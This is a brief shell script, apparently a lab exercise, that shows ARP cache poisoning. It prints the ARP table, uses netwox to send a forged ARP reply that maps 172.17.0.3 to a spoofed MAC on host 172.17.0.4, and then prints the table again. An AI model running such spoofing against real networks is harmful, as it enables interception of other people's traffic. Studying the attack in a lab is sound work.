echo "Before the Attack"
ping 172.17.0.2 -c 3
ping 172.17.0.3 -c 3
ping 172.17.0.4 -c 3
arp
echo ""
echo "The Attack"
sudo netwox 33 --eth-dst 02:42:ac:11:00:04 --arp-ethsrc 08:00:27:eb:09:00 --arp-ipsrc 172.17.0.3 --arp-ethdst 02:42:ac:11:00:04 --arp-ipdst 172.17.0.4
echo ""
echo "After the Attack"
arp
